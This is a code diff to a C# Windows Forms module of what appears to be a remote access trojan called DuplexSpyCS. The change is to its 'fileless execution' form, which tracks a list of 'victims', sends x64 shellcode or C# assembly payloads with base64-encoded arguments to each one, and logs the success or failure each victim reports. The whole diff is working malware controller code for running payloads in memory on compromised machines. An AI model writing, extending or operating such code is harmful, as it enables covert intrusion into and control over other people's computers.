@@ -17,9 +17,50 @@ namespace DuplexSpyCS
         private bool m_bSignalPause { get; set; }
         private bool m_bSignalStop { get; set; }
 
-        public frmFilelessExec()
+        public frmFilelessExec(List<clsVictim> lsVictim)
         {
             InitializeComponent();
+
+            m_lsVictim = lsVictim;
+
+            m_bSignalPause = false;
+            m_bSignalStop = false;
+        }
+
+        void fnRecv(clsListener listener, clsVictim victim, List<string> lsMsg)
+        {
+            if (!m_lsVictim.Contains(victim))
+                return;
+
+            if (lsMsg[0] == "fle") //Fileless Execution
+            {
+                int nCode = int.Parse(lsMsg[1]);
+                string szMsg = lsMsg[2];
+
+                Invoke(new Action(() =>
+                {
+                    ListViewItem item = listView1.FindItemWithText(victim.ID, true, 0);
+
+                    if (nCode == 0)
+                    {
+                        richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] {szMsg}");
+                        
+                        if (item == null)
+                            return;
+
+                        item.SubItems[1].Text = "Failed";
+                    }
+                    else
+                    {
+                        richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] OK");
+                        
+                        if (item == null)
+                            return;
+
+                        item.SubItems[1].Text = "OK";
+                    }
+                }));
+            }
         }
 
         void fnSendPayload(string[] alpArgs, int nThdCnt, byte[] abData)
@@ -34,6 +75,8 @@ namespace DuplexSpyCS
                     .ToList()
                     );
                 toolStripStatusLabel2.Text = "Running";
+
+                listView1.CheckedItems.Cast<ListViewItem>().ToList().ForEach(x => x.SubItems[1].Text = "?");
             }));
 
             string szArgs = string.Join(",", alpArgs.Select(x => clsCrypto.b64E2Str(x)).ToArray());
@@ -55,7 +98,27 @@ namespace DuplexSpyCS
                     break;
                 }
 
-                ThreadPool.QueueUserWorkItem(x => v.SendCommand($"fle|{szArgs}|{szData}"));
+                //ThreadPool.QueueUserWorkItem(x => v.SendCommand($"fle|{szArgs}|{szData}"));
+                if (radioButton1.Checked)
+                {
+                    ThreadPool.QueueUserWorkItem(x => v.fnSendCommand(new string[]
+                    {
+                        "fle",
+                        "x64",
+                        string.Empty,
+                        szData
+                    }));
+                }
+                else if (radioButton2.Checked)
+                {
+                    ThreadPool.QueueUserWorkItem(x => v.fnSendCommand(new string[]
+                    {
+                        "fle",
+                        "cs",
+                        szArgs,
+                        szData,
+                    }));
+                }
             }
         }
 
@@ -64,9 +127,15 @@ namespace DuplexSpyCS
             //Controls
             listView1.FullRowSelect = true;
             listView1.CheckBoxes = true;
+            
             toolStripStatusLabel1.Text = $"Target[{m_lsVictim.Count}]";
             toolStripStatusLabel2.Text = string.Empty;
+
             radioButton1.Checked = true;
+
+            numericUpDown1.Value = 1;
+            numericUpDown1.Minimum = 1;
+            numericUpDown1.Maximum = 100;
 
             //setup
             foreach (clsVictim v in m_lsVictim)
@@ -109,9 +178,6 @@ namespace DuplexSpyCS
         //Go
         private void button4_Click(object sender, EventArgs e)
         {
-            m_bSignalPause = false;
-            m_bSignalStop = false;
-
             string szFileName = textBox1.Text;
             string szArgs = textBox2.Text;
 
@@ -151,7 +217,7 @@ namespace DuplexSpyCS
 
         private void radioButton1_CheckedChanged(object sender, EventArgs e)
         {
-            groupBox1.Enabled = radioButton1.Checked;
+            textBox2.Enabled = !radioButton1.Checked;
         }
     }
 }
